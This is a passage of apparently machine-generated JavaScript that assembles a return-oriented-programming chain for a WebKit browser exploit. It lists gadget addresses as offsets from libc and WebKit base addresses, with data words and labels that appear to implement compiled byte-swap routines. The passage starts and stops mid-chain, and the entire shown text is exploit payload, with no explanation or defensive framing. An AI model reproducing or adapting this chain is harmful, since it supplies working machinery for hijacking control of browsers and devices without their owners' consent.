libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
__swbuf_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+142896, //L1951
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L1951:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+142968, //L1953
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L1953:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+143080, //L1955
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+143096, //L1956
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L1954:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L1955:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L1956:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+143200, //L1959
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+143184, //L1958
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1958:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1959:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+143312, //L1961
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+143344, //L1963
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+143328, //L1962
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1961:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1962:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+143448, //L1964
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+143464, //L1965
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1964:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1965:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+143584, //L1966
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+143568, //L1967
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1967:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L1966:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+143672, //L1969
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+143656, //L1968
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1968:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1969:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+143776, //L1970
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+143792, //L1971
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1970:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+143912, //L1972
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+143896, //L1973
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1973:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L1972:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+143984, //L1975
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L1975:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+144096, //L1977
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+144112, //L1978
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L1976:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L1977:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L1978:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+144216, //L1981
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+144200, //L1980
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1980:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1981:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+144376, //L1984
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+144408, //L1986
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+144360, //L1983
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+144392, //L1985
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1983:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1984:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1985:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1986:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+144568, //L1990
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+144536, //L1988
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+144552, //L1989
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1987:
db([32, 0]); // 0x20
set_gadget(libc_base+165442,); //pop rdi
//L1988:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1989:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+144688, //L1991
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+144720, //L1993
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+144704, //L1992
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1991:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1992:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+144824, //L1994
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+144840, //L1995
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1994:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1995:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+144960, //L1996
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+144944, //L1997
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1997:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L1996:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+145048, //L1999
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+145032, //L1998
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1998:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+145152, //L2000
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+145168, //L2001
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2000:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2001:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+145288, //L2002
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+145272, //L2003
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2003:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2002:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+145360, //L2005
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2005:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+145472, //L2007
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+145488, //L2008
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L2006:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L2007:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L2008:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+145592, //L2011
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+145576, //L2010
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2010:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229840, //mov ax, [rdi]
libc_base+713278, //pop rsi
ropchain+145752, //L2016
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+145720, //L2014
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+145736, //L2015
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2013:
db([16, 0]); // 0x10
set_gadget(libc_base+165442,); //pop rdi
//L2014:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2015:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+145808, //L2017
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L2017:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+145936, //L2020
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+145952, //L2021
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+145920, //L2019
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2019:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2020:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2021:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+146112, //L2025
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+146080, //L2023
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+146096, //L2024
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2022:
db([48, 0]); // 0x30
set_gadget(libc_base+165442,); //pop rdi
//L2023:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2024:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+146216, //L2027
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+146200, //L2026
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2026:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2027:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2028:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L2029:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+146424, //L2032
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+146408, //L2031
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2030:
db([48, 0]); // 0x30
set_gadget(webkit_base+3789839,); //pop r11
//L2031:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2032:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+146528, //L2034
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+146512, //L2033
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2033:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2034:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+146624, //L2036
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2035:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L2036:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+146728, //L2039
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+146712, //L2038
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2038:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2039:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229840, //mov ax, [rdi]
libc_base+713278, //pop rsi
ropchain+146888, //L2044
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+146856, //L2042
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+146872, //L2043
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2041:
db([16, 0]); // 0x10
set_gadget(libc_base+165442,); //pop rdi
//L2042:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2043:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2044:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+146944, //L2045
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L2045:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+147072, //L2048
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+147088, //L2049
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+147056, //L2047
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2047:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2048:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2049:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+147248, //L2053
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+147216, //L2051
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+147232, //L2052
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2050:
db([48, 0]); // 0x30
set_gadget(libc_base+165442,); //pop rdi
//L2051:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2052:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2053:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+147352, //L2055
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+147336, //L2054
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2054:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2055:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2056:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L2057:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+147552, //L2060
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+147536, //L2059
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2058:
db([32, 0]); // 0x20
set_gadget(webkit_base+3789839,); //pop r11
//L2059:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+147656, //L2062
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+147640, //L2061
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2061:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+147768, //L2065
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+147752, //L2064
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2063:
db([48, 0]); // 0x30
set_gadget(webkit_base+3789839,); //pop r11
//L2064:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+147832, //L2066
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+772328 //pop rcx
]);
//L2066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+147888, //L2068
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2068:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278, //pop rsi
ropchain+148024, //L2070
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+148056, //L2072
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+148040, //L2071
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2070:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2071:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2072:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+148216, //L2076
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+148184, //L2074
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+148200, //L2075
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2073:
db([48, 0]); // 0x30
